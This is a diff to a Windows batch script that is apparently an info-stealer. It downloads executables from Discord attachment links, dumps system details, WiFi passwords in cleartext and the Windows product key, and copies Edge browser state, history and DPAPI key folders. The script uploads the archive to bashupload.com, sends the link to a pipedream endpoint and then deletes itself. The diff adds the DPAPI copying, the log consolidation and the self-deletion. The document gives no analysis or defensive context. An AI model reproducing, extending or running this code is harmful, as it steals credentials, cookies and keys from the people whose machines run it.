@@ -1,3 +1,8 @@
+@echo off
+set LOGFILE=batch.log
+call :LOG > %LOGFILE%
+exit /B
+:LOG
 cd %tmp%
 mkdir 136babaa-c461-4d07-8a65-20cd38c253b4
 cd 136babaa-c461-4d07-8a65-20cd38c253b4
@@ -7,12 +12,31 @@ mkdir disc
 curl -k "https://cdn.discordapp.com/attachments/985807216894423050/1093092269298569218/screenCapture.exe" -o "s.exe"
 curl -k "https://cdn.discordapp.com/attachments/985807216894423050/1089826569326956614/7zr.exe" -o "c.exe"
 "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\s.exe" 1.png
-systeminfo > sysinf.log
-netsh wlan show profiles > w.log
-netsh wlan export profile key=clear > wpass.log
-wmic csproduct get uuid > uuid.log
-wmic path win32_VideoController get name > vid.log
-powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault >bckky.log
+echo System Information: >> info.log
+systeminfo >> info.log
+echo Username: %username% >> info.log
+echo Computer Name: %COMPUTERNAME% >> info.log
+echo AppData Path: %appdata% >> info.log
+echo Local AppData Path: %localappdata% >> info.log
+echo Home Path: %HOMEPATH% >> info.log
+echo Temp Path: %TEMP% >> info.log
+echo Current Working Directory: %CD% >> info.log
+echo Date Generated: %TIME% %date% >> info.log
+echo Number of Processors: %NUMBER_OF_PROCESSORS% >> info.log
+echo: >> info.log
+echo WiFi Information: >> info.log
+netsh wlan show profiles >> info.log
+netsh wlan export profile key=clear >> info.log
+echo: >> info.log
+echo Windows UUID: >> info.log
+wmic csproduct get uuid >> info.log
+echo: >> info.log
+echo Windows GPU: >> info.log
+wmic path win32_VideoController get name >> info.log
+echo: >> info.log
+echo Backup Product Key: >> info.log
+powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault >> info.log
+echo d | xcopy "%appdata%\Microsoft\Protect\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\Protect\" /H /S /E
 echo f | xcopy "%localappdata%\Microsoft\Edge\User Data\Local State" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\Local State"
 echo d | xcopy "%localappdata%\Microsoft\Edge\User Data\Default\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\Network\"
 echo f | xcopy "%localappdata%\Microsoft\Edge\User Data\Default\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\History"
@@ -48,3 +72,4 @@ curl bashupload.com -T 136babaa-c461-4d07-8a65-20cd38c253b4.7z > lockfile
 curl --data-binary "@lockfile" https://eokpgydzihqmnf4.m.pipedream.net
 cd %tmp%
 rmdir C:\Users\reiha\AppData\Local\Temp\136babaa-c461-4d07-8a65-20cd38c253b4 /S /Q
+start /b "" cmd /c del "%~f0"&exit /b
